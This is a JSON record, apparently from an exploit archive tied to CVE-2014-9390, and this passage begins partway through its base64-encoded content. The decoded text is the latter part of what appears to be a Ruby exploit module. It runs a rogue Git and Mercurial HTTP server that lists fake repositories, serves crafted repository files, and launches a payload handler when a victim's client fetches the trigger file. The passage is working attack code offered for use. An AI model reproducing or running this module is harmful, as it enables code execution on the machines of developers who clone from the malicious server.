2l0ICN7cmVxX2ZpbGV9IikNCiAgICAgIHNlbmRfcmVzcG9uc2UoY2xpLCBAcmVwb19kYXRhWzpnaXRdWzpmaWxlc11bcmVxX2ZpbGVdKQ0KICAgICAgaWYgcmVxX2ZpbGUgPT0gQHJlcG9fZGF0YVs6Z2l0XVs6dHJpZ2dlcl0NCiAgICAgICAgdnByaW50X3N0YXR1cygiVHJpZ2dlciEiKQ0KICAgICAgICAjIERvIHdlIG5lZWQgdGhpcz8gIElmIHNvLCBob3cgY2FuIEkgdXBkYXRlIHRoZSBwYXlsb2FkIHdoaWNoIGlzIGluIGEgZmlsZSB3aGljaA0KICAgICAgICAjIGhhcyBhbHJlYWR5IGJlZW4gYnVpbHQ/DQogICAgICAgICMgcmVnZW5lcmF0ZV9wYXlsb2FkDQogICAgICAgIGhhbmRsZXIoY2xpKQ0KICAgICAgZW5kDQogICAgZWxzZQ0KICAgICAgdnByaW50X3N0YXR1cygiR2l0ICN7cmVxX2ZpbGV9IGRvZXNuJ3QgZXhpc3QiKQ0KICAgICAgc2VuZF9ub3RfZm91bmQoY2xpKQ0KICAgIGVuZA0KICBlbmQNCg0KICAjIHNpbXVsYXRlcyBhbiBIVFRQIHNlcnZlciB3aXRoIHNpbXBsZSBIVE1MIGNvbnRlbnQgdGhhdCBsaXN0cyB0aGUgZmFrZQ0KICAjIHJlcG9zaXRvcmllcyBhdmFpbGFibGUgZm9yIGNsb25pbmcNCiAgZGVmIGRvX2h0bWwoY2xpLCBfcmVxKQ0KICAgIHJlc3AgPSBjcmVhdGVfcmVzcG9uc2UNCiAgICByZXNwLmJvZHkgPSA8PEhUTUwNCiAgICAgPGh0bWw+DQogICAgICA8aGVhZD48dGl0bGU+UHVibGljIFJlcG9zaXRvcmllczwvdGl0bGU+PC9oZWFkPg0KICAgICAgPGJvZHk+DQogICAgICAgIDxwPkhlcmUgYXJlIG91ciBwdWJsaWMgcmVwb3NpdG9yaWVzOjwvcD4NCiAgICAgICAgPHVsPg0KSFRNTA0KDQogICAgaWYgZGF0YXN0b3JlWydHSVQnXQ0KICAgICAgdGhpc19naXRfdXJpID0gVVJJLnBhcnNlKGdldF91cmkpLm1lcmdlKGdpdF91cmkpDQogICAgICByZXNwLmJvZHkgPDwgIjxsaT48YSBocmVmPSN7Z2l0X3VyaX0+R2l0PC9hPiAoY2xvbmUgd2l0aCBgZ2l0IGNsb25lICN7dGhpc19naXRfdXJpfWApPC9saT4iDQogICAgZWxzZQ0KICAgICAgcmVzcC5ib2R5IDw8ICI8bGk+PGE+R2l0PC9hPiAoY3VycmVudGx5IG9mZmxpbmUpPC9saT4iDQogICAgZW5kDQoNCiAgICBpZiBkYXRhc3RvcmVbJ01FUkNVUklBTCddDQogICAgICB0aGlzX21lcmN1cmlhbF91cmkgPSBVUkkucGFyc2UoZ2V0X3VyaSkubWVyZ2UobWVyY3VyaWFsX3VyaSkNCiAgICAgIHJlc3AuYm9keSA8PCAiPGxpPjxhIGhyZWY9I3ttZXJjdXJpYWxfdXJpfT5NZXJjdXJpYWw8L2E+IChjbG9uZSB3aXRoIGBoZyBjbG9uZSAje3RoaXNfbWVyY3VyaWFsX3VyaX1gKTwvbGk+Ig0KICAgIGVsc2UNCiAgICAgIHJlc3AuYm9keSA8PCAiPGxpPjxhPk1lcmN1cmlhbDwvYT4gKGN1cnJlbnRseSBvZmZsaW5lKTwvbGk+Ig0KICAgIGVuZA0KICAgIHJlc3AuYm9keSA8PCA8PEhUTUwNCiAgICAgICAgPC91bD4NCiAgICAgIDwvYm9keT4NCiAgICA8L2h0bWw+DQpIVE1MDQoNCiAgICBjbGkuc2VuZF9yZXNwb25zZShyZXNwKQ0KICBlbmQNCg0KICAjIHNpbXVsYXRlcyBhIE1lcmN1cmlhbCBIVFRQIHNlcnZlcg0KICBkZWYgZG9fbWVyY3VyaWFsKGNsaSwgcmVxKQ0KICAgICMgZGV0ZXJtaW5lIGlmIHRoZSByZXF1ZXN0ZWQgZmlsZSBpcyBzb21ldGhpbmcgd2Uga25vdyBob3cgdG8gc2VydmUgZnJvbSBvdXINCiAgICAjIGZha2UgcmVwb3NpdG9yeSBhbmQgc2VuZCBpdCBpZiBzbw0KICAgIHVyaSA9IFVSSS5wYXJzZShyZXEudXJpKQ0KICAgIHJlcV9wYXRoID0gdXJpLnBhdGgNCiAgICByZXFfcGF0aCArPSAiPyN7dXJpLnF1ZXJ5fSIgaWYgdXJpLnF1ZXJ5DQogICAgcmVxX3BhdGguZ3N1YiEoL14je21lcmN1cmlhbF91cml9LywgJycpDQogICAgaWYgQHJlcG9fZGF0YVs6bWVyY3VyaWFsXVs6ZmlsZXNdLmtleT8ocmVxX3BhdGgpDQogICAgICB2cHJpbnRfc3RhdHVzKCJTZW5kaW5nIE1lcmN1cmlhbCAje3JlcV9wYXRofSIpDQogICAgICBzZW5kX3Jlc3BvbnNlKGNsaSwgQHJlcG9fZGF0YVs6bWVyY3VyaWFsXVs6ZmlsZXNdW3JlcV9wYXRoXSwgJ0NvbnRlbnQtVHlwZScgPT4gJ2FwcGxpY2F0aW9uL21lcmN1cmlhbC0wLjEnKQ0KICAgICAgaWYgcmVxX3BhdGggPT0gQHJlcG9fZGF0YVs6bWVyY3VyaWFsXVs6dHJpZ2dlcl0NCiAgICAgICAgdnByaW50X3N0YXR1cygiVHJpZ2dlciEiKQ0KICAgICAgICAjIERvIHdlIG5lZWQgdGhpcz8gIElmIHNvLCBob3cgY2FuIEkgdXBkYXRlIHRoZSBwYXlsb2FkIHdoaWNoIGlzIGluIGEgZmlsZSB3aGljaA0KICAgICAgICAjIGhhcyBhbHJlYWR5IGJlZW4gYnVpbHQ/DQogICAgICAgICMgcmVnZW5lcmF0ZV9wYXlsb2FkDQogICAgICAgIGhhbmRsZXIoY2xpKQ0KICAgICAgZW5kDQogICAgZWxzZQ0KICAgICAgdnByaW50X3N0YXR1cygiTWVyY3VyaWFsICN7cmVxX3BhdGh9IGRvZXNuJ3QgZXhpc3QiKQ0KICAgICAgc2VuZF9ub3RfZm91bmQoY2xpKQ0KICAgIGVuZA0KICBlbmQNCg0KICAjIFJldHVybnMgdGhlIHZhbHVlIG9mIEdJVF9VUkkgaWYgbm90IGJsYW5rLCBvdGhlcndpc2UgcmV0dXJucyBhIHJhbmRvbSAuZ2l0IFVSSQ0KICBkZWYgZ2l0X3VyaQ0KICAgIHJldHVybiBAZ2l0X3VyaSBpZiBAZ2l0X3VyaQ0KICAgIGlmIGRhdGFzdG9yZVsnR0lUX1VSSSddLmJsYW5rPw0KICAgICAgQGdpdF91cmkgPSAnLycgKyBSZXg6OlRleHQucmFuZF90ZXh0X2FscGhhKHJhbmQoMTApICsgMikuZG93bmNhc2UgKyAnLmdpdCcNCiAgICBlbHNlDQogICAgICBAZ2l0X3VyaSA9IGRhdGFzdG9yZVsnR0lUX1VSSSddDQogICAgZW5kDQogIGVuZA0KDQogICMgUmV0dXJucyB0aGUgdmFsdWUgb2YgTUVSQ1VSSUFMX1VSSSBpZiBub3QgYmxhbmssIG90aGVyd2lzZSByZXR1cm5zIGEgcmFuZG9tIFVSSQ0KICBkZWYgbWVyY3VyaWFsX3VyaQ0KICAgIHJldHVybiBAbWVyY3VyaWFsX3VyaSBpZiBAbWVyY3VyaWFsX3VyaQ0KICAgIGlmIGRhdGFzdG9yZVsnTUVSQ1VSSUFMX1VSSSddLmJsYW5rPw0KICAgICAgQG1lcmN1cmlhbF91cmkgPSAnLycgKyBSZXg6OlRleHQucmFuZF90ZXh0X2FscGhhKHJhbmQoMTApICsgNikuZG93bmNhc2UNCiAgICBlbHNlDQogICAgICBAbWVyY3VyaWFsX3VyaSA9IGRhdGFzdG9yZVsnTUVSQ1VSSUFMX1VSSSddDQogICAgZW5kDQogIGVuZA0KZW5k", 
    "filename": "platforms/multiple/remote/41684.rb", 
    "id": "41684", 
    "cves": [
        "CVE-2014-9390"
    ]
}